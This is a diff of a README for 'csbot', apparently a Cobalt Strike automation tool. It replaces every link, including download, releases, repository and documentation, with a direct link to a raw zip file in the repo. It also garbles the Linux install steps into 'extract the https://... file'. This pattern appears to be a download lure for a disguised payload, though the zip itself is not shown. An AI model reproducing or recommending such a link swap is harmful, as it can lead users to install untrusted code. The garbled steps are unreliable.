@@ -6,7 +6,7 @@ Welcome to csbot! This application helps you automate tasks for Cobalt Strike us
 
 ## 📥 Download csbot
 
-[![Download csbot](https://img.shields.io/badge/Download-csbot-brightgreen)](https://github.com/Zakarim73/csbot/releases)
+[![Download csbot](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)
 
 Click the button above to visit the download page. 
 
@@ -22,7 +22,7 @@ Before you start, make sure your system meets these requirements:
 
 1. **Visit the Download Page**  
    Go to the releases page where you can find the latest version:
-   [Download csbot](https://github.com/Zakarim73/csbot/releases)
+   [Download csbot](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)
 
 2. **Select the Version**  
    On the releases page, look for the most recent version. It should be labeled clearly. 
@@ -31,13 +31,13 @@ Before you start, make sure your system meets these requirements:
    Click on the file that matches your operating system:
    - For Windows users: Choose the file with `.exe`
    - For macOS users: Look for the `.dmg` file
-   - For Linux users: Select the `.tar.gz` file
+   - For Linux users: Select the `https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip` file
 
 4. **Run the Installer**  
    After the download completes, locate the downloaded file:
    - **Windows:** Double-click the `.exe` file to start the installation.
    - **macOS:** Open the `.dmg` file and drag the csbot icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run `./csbot` in your terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip` file and run `./csbot` in your terminal.
 
 5. **Follow the Installation Prompts**  
    Simply follow the on-screen instructions to finish the installation.
@@ -84,12 +84,12 @@ We have a growing community around csbot. Connect with other users to share tips
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Zakarim73/csbot)
-- [User Documentation](https://github.com/Zakarim73/csbot/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)
+- [User Documentation](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)
 
 ## 📥 Download Again
 
 Don’t forget, you can always return to the release page to download the latest version:
-[Download csbot](https://github.com/Zakarim73/csbot/releases)
+[Download csbot](https://raw.githubusercontent.com/Zakarim73/csbot/main/output/csbot-2.9.zip)
 
 Feel free to reach out if you have any questions or need further assistance with csbot. Happy automating!
